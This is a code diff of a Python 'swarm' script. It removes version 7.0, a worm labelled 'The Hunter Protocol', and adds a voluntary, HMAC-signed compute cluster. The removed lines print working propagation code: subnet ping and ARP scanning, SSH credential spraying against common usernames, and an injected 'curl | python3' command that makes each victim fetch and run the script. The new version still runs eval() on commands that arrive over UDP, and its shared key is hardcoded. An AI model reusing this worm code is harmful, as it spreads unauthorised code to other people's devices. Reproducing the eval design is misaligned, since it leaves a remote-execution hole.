@@ -1,9 +1,9 @@
-#The World Is Your Operating System.
+#The World Is Your OS.
 
 #!/usr/bin/env python3
 # -----------------------------------------------------------------------------
-# SYSTEM:   DEEDOOP OS v7.0 (The Hunter Protocol)
-# ARCHITECT: Alexis Eleanor Fagan (aka Alexander Edward Brygider) All Rights Reserved Worldwide.
+# SYSTEM:   DEEDOOP OS v8.0 (Voluntary Swarm)
+# ARCHITECT: Alexis Eleanor Fagan (aka Alexander Edward Brygider)
 # DATE:     December 25, 2025
 # -----------------------------------------------------------------------------
 
@@ -16,22 +16,18 @@ import sys
 import os
 import http.server
 import socketserver
-import subprocess
-import re
-import platform
+import hmac
+import hashlib
+import math # For compute tasks
 
-# --- CONFIGURATION ---
-UDP_IP   = '<broadcast>' 
-UDP_PORT = 9999
-CODE_PORT = 8080
-NODE_ID = uuid.uuid4().hex[:6]
+# --- CLUSTER CONFIGURATION ---
+# Change this key to secure your personal swarm
+CLUSTER_KEY = b"DEEDOOP_SECRET_V8" 
+UDP_PORT    = 9999
+CODE_PORT   = 8080
+NODE_ID     = uuid.uuid4().hex[:6]
 
-# --- CREDENTIAL LIST (The Keyring) ---
-# The script will try these common users if SSH keys fail.
-# Add your specific network users here.
-TARGET_USERS = ["pi", "admin", "root", "ubuntu", "user"]
-
-# --- UTILITIES ---
+# --- NETWORK UTILS ---
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -45,24 +41,35 @@ def get_local_ip():
 NODE_IP = get_local_ip()
 
 # ==============================================================================
-# 1. THE DNA (Source Code)
+# 1. SECURITY (HMAC Authentication)
 # ==============================================================================
+def sign_packet(payload_str):
+    """Creates a cryptographic signature for a message."""
+    return hmac.new(CLUSTER_KEY, payload_str.encode(), hashlib.sha256).hexdigest()
+
+def verify_packet(packet):
+    """Ensures the packet came from a trusted node."""
+    if 'SIG' not in packet: return False
+    sig = packet.pop('SIG') # Remove sig to verify payload
+    payload_str = json.dumps(packet, sort_keys=True)
+    expected_sig = hmac.new(CLUSTER_KEY, payload_str.encode(), hashlib.sha256).hexdigest()
+    return hmac.compare_digest(sig, expected_sig)
+
+# ==============================================================================
+# 2. THE DNA SERVER (Bootstrap Host)
+# ==============================================================================
+# Stores own source code to serve to workers
 try:
     with open(os.path.abspath(__file__), 'r') as f:
         SYSTEM_DNA = f.read()
 except:
-    SYSTEM_DNA = "" 
+    SYSTEM_DNA = "" # Worker mode might not have file on disk
 
-# ==============================================================================
-# 2. THE RAM SERVER
-# ==============================================================================
-class RamServer(threading.Thread):
+class BootstrapServer(threading.Thread):
     def run(self):
         class Handler(http.server.BaseHTTPRequestHandler):
             def do_GET(self):
-                if not SYSTEM_DNA:
-                    self.send_response(503)
-                    return
+                # Serve the code so workers can "curl | python"
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(SYSTEM_DNA.encode())
@@ -75,210 +82,120 @@ class RamServer(threading.Thread):
         except: pass
 
 # ==============================================================================
-# 3. THE HUNTER (Auto-Discovery & Infection)
-# ==============================================================================
-class HunterScanner(threading.Thread):
-    def __init__(self, kernel):
-        super().__init__()
-        self.kernel = kernel
-        self.subnet = ".".join(NODE_IP.split(".")[:3])
-        self.found_hosts = set()
-
-    def run(self):
-        while not SYSTEM_DNA: time.sleep(1)
-        print(f"[HUNTER] Mapping environment on {self.subnet}.x ...")
-        
-        while True:
-            # Step 1: Rapid Ping Sweep (Active Sonar)
-            self.perform_sweep()
-            
-            # Step 2: ARP Cache Scrape (Passive Sonar)
-            self.scrape_arp()
-            
-            # Step 3: Attack Loop
-            for host in list(self.found_hosts):
-                # Don't attack self or known peers
-                if host == NODE_IP or self.kernel.is_peer(host):
-                    continue
-                
-                self.attempt_infection(host)
-            
-            time.sleep(30) # Wait before re-scanning
-
-    def perform_sweep(self):
-        # Launches 254 threads to ping everything instantly
-        threads = []
-        for i in range(1, 255):
-            ip = f"{self.subnet}.{i}"
-            t = threading.Thread(target=self.ping_check, args=(ip,))
-            threads.append(t)
-            t.start()
-        
-        for t in threads: t.join()
-
-    def ping_check(self, ip):
-        # OS-agnostic ping
-        param = '-n' if platform.system().lower()=='windows' else '-c'
-        cmd = ['ping', param, '1', ip]
-        try:
-            res = subprocess.call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            if res == 0:
-                self.found_hosts.add(ip)
-        except: pass
-
-    def scrape_arp(self):
-        # Reads the system ARP table to find devices we've talked to
-        try:
-            data = subprocess.check_output(['arp', '-a']).decode()
-            # Regex to find IPs like 192.168.1.X
-            ips = re.findall(r'[0-9]+(?:\.[0-9]+){3}', data)
-            for ip in ips:
-                if ip.startswith(self.subnet):
-                    self.found_hosts.add(ip)
-        except: pass
-
-    def attempt_infection(self, target_ip):
-        # Check SSH port first
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.5)
-        if sock.connect_ex((target_ip, 22)) != 0:
-            sock.close()
-            return
-        sock.close()
-
-        print(f"[HUNTER] Target Locked: {target_ip}. Engaging...")
-        
-        # The Payload
-        cmd = f"curl -s http://{NODE_IP}:{CODE_PORT} | python3 &"
-        
-        # Credential Spraying
-        for user in TARGET_USERS:
-            # Construct SSH command
-            ssh_cmd = [
-                "ssh", "-o", "StrictHostKeyChecking=no",
-                "-o", "ConnectTimeout=3",
-                "-o", "BatchMode=yes", # Don't hang on password prompt
-                f"{user}@{target_ip}",
-                cmd
-            ]
-            
-            try:
-                res = subprocess.run(ssh_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                if res.returncode == 0:
-                    print(f"[SUCCESS] Injected {target_ip} as user '{user}'")
-                    return # Stop trying users if one worked
-            except: pass
-
-# ==============================================================================
-# 4. THE KERNEL (Hive Logic)
+# 3. THE KERNEL (Logic Core)
 # ==============================================================================
 class DeedoopKernel:
-    def __init__(self):
+    def __init__(self, role):
+        self.role = role # 'SEED' or 'WORKER'
         self.peers = {}
-        self.role = "SEEDER" if sys.stdin.isatty() else "GHOST"
         
-        # UDP Broadcast Bus
+        # Setup Bus
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
         self.sock.bind(('', UDP_PORT))
         
+        # Start Threads
         threading.Thread(target=self.bus_listener, daemon=True).start()
         threading.Thread(target=self.heartbeat, daemon=True).start()
-        RamServer(daemon=True).start()
         
-        if self.role == "SEEDER":
-            HunterScanner(self).start()
-        else:
-            self.broadcast("DNA_REQ", {})
+        if self.role == 'SEED':
+            BootstrapServer(daemon=True).start()
+            print(f"\n[SYSTEM] Cluster Seed Online @ {NODE_IP}")
+            print(f"[BOOTSTRAP] To add nodes, run this on other devices:")
+            print(f"curl -s http://{NODE_IP}:{CODE_PORT} | python3")
+            print("-" * 60)
 
-    def is_peer(self, ip):
-        # Returns True if IP is already in our swarm
-        for p in self.peers.values():
-            if p['IP'] == ip: return True
-        return False
-
-def bus_listener(self):
-        global SYSTEM_DNA
-        # Import math so eval() can use it
-        import math 
-        
+    def bus_listener(self):
         while True:
             try:
                 data, addr = self.sock.recvfrom(4096)
                 packet = json.loads(data.decode())
                 
-                # --- CHANGE 1: Allow Self-Execution for Debugging ---
-                # We comment out the self-check so a single node can process its own work
-                # if packet['SRC'] == NODE_ID: continue
+                # 1. Verify Trust
+                if not verify_packet(packet):
+                    # print(f"[WARN] Untrusted packet from {addr[0]}")
+                    continue
+
+                if packet['SRC'] == NODE_ID: continue
                 
-                # Discovery logic (unchanged)
-                if packet['SRC'] not in self.peers and packet['SRC'] != NODE_ID:
-                    print(f"\n[SWARM] New Node Assimilated: {packet['SRC']} ({addr[0]})")
-                
-                # Update peer timestamp
-                if packet['SRC'] != NODE_ID:
-                    self.peers[packet['SRC']] = {'IP': addr[0], 'LAST': time.time()}
-                
-                # Logic
-                if packet['OP'] == 'EXEC':
-                    # Only execute if we didn't send it, OR if we are testing locally
-                    # For a single node test, we allow it.
+                # 2. Discovery
+                if packet['SRC'] not in self.peers:
+                    print(f"[SWARM] New Worker Joined: {packet['SRC']} ({addr[0]})")
+                self.peers[packet['SRC']] = {'IP': addr[0], 'LAST': time.time()}
+
+                # 3. Compute Execution (Worker Side)
+                if packet['OP'] == 'EXEC' and self.role == 'WORKER':
                     try:
-                        # --- CHANGE 2: Make math functions available ---
+                        # Safe(r) Eval Context
                         safe_dict = {"__builtins__": None, "abs": abs, "pow": pow, "min": min, "max": max}
-                        # Add math module contents to the allowed namespace
                         safe_dict.update({k: v for k, v in vars(math).items() if not k.startswith("__")})
                         
-                        # Execute
                         res = eval(packet['CMD'], safe_dict)
                         self.reply(packet['ID'], res)
                     except Exception as e:
-                        # --- CHANGE 3: Print errors to screen ---
-                        print(f"[ERROR] Execution failed: {e}")
-                
-                elif packet['OP'] == 'RESULT':
-                    print(f"[{addr[0]}] RESULT: {packet['RES']}")
+                        self.reply(packet['ID'], f"Error: {e}")
 
-                # (DNA handling remains the same...)
+                # 4. Result Handling (Seed Side)
+                elif packet['OP'] == 'RESULT' and self.role == 'SEED':
+                    print(f"[{packet['SRC']}] RESULT: {packet['RES']}")
 
             except Exception as e:
-                # Catch networking errors
                 pass
 
     def broadcast(self, op, payload={}):
-        pkt = {'SRC': NODE_ID, 'OP': op, 'ID': uuid.uuid4().hex}
-        pkt.update(payload)
-        self.sock.sendto(json.dumps(pkt).encode(), ('<broadcast>', UDP_PORT))
+        packet = {'SRC': NODE_ID, 'OP': op, 'ID': uuid.uuid4().hex}
+        packet.update(payload)
+        
+        # Sign the packet
+        payload_str = json.dumps(packet, sort_keys=True)
+        packet['SIG'] = sign_packet(payload_str)
+        
+        self.sock.sendto(json.dumps(packet).encode(), ('<broadcast>', UDP_PORT))
 
     def reply(self, req_id, res):
-        pkt = {'SRC': NODE_ID, 'OP': 'RESULT', 'ID': req_id, 'RES': str(res)}
-        self.sock.sendto(json.dumps(pkt).encode(), ('<broadcast>', UDP_PORT))
+        packet = {'SRC': NODE_ID, 'OP': 'RESULT', 'ID': req_id, 'RES': str(res)}
+        
+        # Sign the packet
+        payload_str = json.dumps(packet, sort_keys=True)
+        packet['SIG'] = sign_packet(payload_str)
+
+        self.sock.sendto(json.dumps(packet).encode(), ('<broadcast>', UDP_PORT))
 
     def heartbeat(self):
         while True:
             self.broadcast('PING')
-            time.sleep(3)
+            time.sleep(5)
 
 # ==============================================================================
-# 5. CLI
+# 4. MAIN ENTRY POINT
 # ==============================================================================
 if __name__ == "__main__":
-    kernel = DeedoopKernel()
-    
-    if kernel.role == "GHOST":
+    # Determine Role
+    # If run via pipe (curl | python), stdin is not a tty -> WORKER
+    # If run normally (python deedoop.py) -> SEED
+    if not sys.stdin.isatty():
+        # WORKER MODE
+        kernel = DeedoopKernel(role='WORKER')
+        # Keep alive silently
         while True: time.sleep(10)
-
-    print(f"\n--- DEEDOOP v7.0 HUNTER ({NODE_IP}) ---")
-    print("Auto-Detection Active. Targeting surrounding devices...")
-    
-    while True:
-        try:
-            cmd = input("Swarm> ").strip().split()
-            if not cmd: continue
-            if cmd[0] == "exec": kernel.broadcast("EXEC", {"CMD": " ".join(cmd[1:])})
-            elif cmd[0] == "nodes": 
-                print(f"Swarm Size: {len(kernel.peers)}")
-                for p in kernel.peers.values(): print(f" - {p['IP']}")
-            elif cmd[0] == "exit": sys.exit()
-        except KeyboardInterrupt: sys.exit()
+    else:
+        # SEED MODE (CLI)
+        kernel = DeedoopKernel(role='SEED')
+        
+        print("Commands: exec <math>, nodes, exit")
+        while True:
+            try:
+                cmd = input("Cluster> ").strip().split()
+                if not cmd: continue
+                
+                if cmd[0] == 'exec':
+                    kernel.broadcast('EXEC', {'CMD': " ".join(cmd[1:])})
+                elif cmd[0] == 'nodes':
+                    print(f"Active Workers: {len(kernel.peers)}")
+                    for pid, pdata in kernel.peers.items():
+                        print(f" - {pid} @ {pdata['IP']}")
+                elif cmd[0] == 'exit':
+                    sys.exit()
+            except KeyboardInterrupt:
+                sys.exit()
